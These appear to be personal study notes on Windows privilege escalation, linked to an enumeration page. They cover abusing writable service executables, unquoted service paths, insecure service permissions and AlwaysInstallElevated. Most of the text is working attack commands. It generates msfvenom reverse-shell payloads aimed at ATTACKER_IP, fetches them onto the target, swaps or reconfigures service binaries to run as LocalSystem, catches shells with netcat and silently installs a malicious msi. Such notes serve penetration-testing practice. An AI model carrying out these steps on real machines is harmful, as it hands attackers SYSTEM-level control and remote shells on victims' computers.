Notes about privilege escalation on [[Windows]].

## Scheduled Tasks

[[Windows/Enumeration#Scheduled Tasks]]

Check scheduled tasks. Can you overwrite the executable being ran?

## Services

[[Windows/Enumeration#Windows Services]]

Check services. Can you overwrite the service executable?

Generate reverse shell payload on attacking computer:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f exe-service -o payload.exe
```

Run server on attacking computer (defaults to port `8000`):

```bash
python3 -m http.server
```

Download payload on target computer:

```powershell
wget http://ATTACKER_IP:8000/payload.exe -O payload.exe
```

Replace server executable with malicious payload:

```powershell
move payload.exe C:\target\location\service-name.exe
```

Grant permission to executable:

```powershell
icacls C:\target\location\service-name.exe /grant Everyone:F
```

Set up reverse listener on attacking computer:

```bash
nc -lvnp ATTACKER_PORT
```

Wait for service to run on target computer, or try to force restart if you have privileges:

```powershell
sc.exe stop <service-name>
sc.exe start <service-name>
```

Note: Use `sc.exe` in PowerShell or `sc` in Command Prompt.

## Unquoted service paths

[[Windows/Enumeration#Windows Services]]

Run `sc.exe qc <servicename`.

Check if the `BINARY_PATH_NAME` is missing quotes and spaces in path/filename, i.e. `C:\path\to\file name.exe` instead of `"C:\path\to\file name.exe"`. 

If the path has spaces and it is unquoted, you can exploit this. In this example, the service till try to find `file.exe` before it tries to find `file name.exe`, therefore you can put a malicious `file.exe` in the same folder.

## Insecure service permissions

Download [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) to check service permissions. Run `accesschk64.exe -qlc <servicename>`. Check for `SERVICE_ALL_ACCESS` permission, which means you can rewrite service configurations.

Get a malicious executable on the server.

Reconfigure the service to run the executable file:

```powershell
sc.exe config <servicename> binPath= "C:\path\to\malicious\file.exe" obj= LocalSystem
```

Wait for service to run on target computer, or try to force restart if you have privileges:

```powershell
sc.exe stop <servicename>
sc.exe start <service-name>
```

Note: Use `sc.exe` in PowerShell or `sc` in Command Prompt.

## AlwaysInstallElevated

[[Windows/Enumeration#AlwaysInstallElevated]]

Check if `AlwaysInstallElevated` is enabled.

Generate a malicious `.msi` on attacking computer, e.g. using `msvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f msi -o malicious.msi
```

Transfer the malicious `.msi`.

Execute on the target computer:

```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

## Related

- [[Windows]]
- [[Windows/Enumeration]]